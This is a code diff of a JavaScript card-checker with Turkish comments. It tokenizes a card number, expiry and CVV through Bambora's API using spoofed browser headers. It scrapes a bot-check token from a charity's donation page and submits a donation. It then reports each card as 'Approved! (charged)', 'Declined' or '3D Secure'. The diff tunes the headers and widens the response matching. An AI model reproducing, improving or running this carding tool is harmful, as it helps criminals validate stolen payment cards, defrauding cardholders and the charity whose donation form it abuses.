@@ -60,23 +60,21 @@
                 const randomData = this.generateRandomData();
 
                 // 1. Token al
-                const bamboraHeaders = {
-                    'Accept': '*/*',
-                    'Content-Type': 'text/plain; charset=UTF-8',
-                    'Origin': 'https://libs.na.bambora.com',
-                    'Referer': 'https://libs.na.bambora.com/',
-                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
-                };
-                const tokenData = JSON.stringify({
-                    number: cc,
-                    expiry_month: mm,
-                    expiry_year: yearFull,
-                    cvd: cvv
-                });
                 const tokenResp = await fetch('https://api.na.bambora.com/scripts/tokenization/tokens', {
                     method: 'POST',
-                    headers: bamboraHeaders,
-                    body: tokenData
+                    headers: {
+                        'Accept': '*/*',
+                        'Content-Type': 'text/plain; charset=UTF-8',
+                        'Origin': 'https://libs.na.bambora.com',
+                        'Referer': 'https://libs.na.bambora.com/',
+                        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
+                    },
+                    body: JSON.stringify({
+                        number: cc,
+                        expiry_month: mm,
+                        expiry_year: yearFull,
+                        cvd: cvv
+                    })
                 });
                 const tokenJson = await tokenResp.json();
                 const token = tokenJson.token;
@@ -85,7 +83,10 @@
                 // 2. Bot check al
                 const session = await fetch('https://donate.kinvia.ca/single.php', {
                     method: 'GET',
-                    headers: { 'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36' }
+                    headers: { 
+                        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+                        'Cache-Control': 'no-cache'
+                    }
                 });
                 const html = await session.text();
                 const botCheckMatch = html.match(/name="bot_check"\s+value="([^"]*)"/);
@@ -139,7 +140,10 @@
                     'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
                     'Content-Type': 'application/x-www-form-urlencoded',
                     'Origin': 'https://donate.kinvia.ca',
-                    'Referer': 'https://donate.kinvia.ca/single.php'
+                    'Referer': 'https://donate.kinvia.ca/single.php',
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                    'Accept-Language': 'tr-TR,tr;q=0.9,en;q=0.8',
+                    'Cache-Control': 'no-cache'
                 };
                 const resp = await fetch('https://donate.kinvia.ca/donate.php', {
                     method: 'POST',
@@ -148,11 +152,19 @@
                 });
                 const respText = await resp.text();
 
-                // Sonuç kontrolü
-                if (respText.includes('TRANSACTION UNSUCCESSFUL') || respText.includes('Oh no!')) {
+                // Sonuç kontrolü - Daha hassas
+                if (respText.includes('TRANSACTION UNSUCCESSFUL') || 
+                    respText.includes('Oh no!') ||
+                    respText.includes('unable to obtain authorization') ||
+                    respText.includes('Declined')) {
                     return 'Declined! (transaction unsuccessful)';
-                } else if (respText.includes('Thank you') || respText.includes('success')) {
+                } else if (respText.includes('Thank you') || 
+                          respText.includes('success') || 
+                          respText.includes('received') ||
+                          respText.includes('Your donation')) {
                     return 'Approved! (charged)';
+                } else if (respText.includes('3D Secure') || respText.includes('3DS')) {
+                    return '3D Secure! (3DS)';
                 } else {
                     return 'Declined! (unknown response)';
                 }
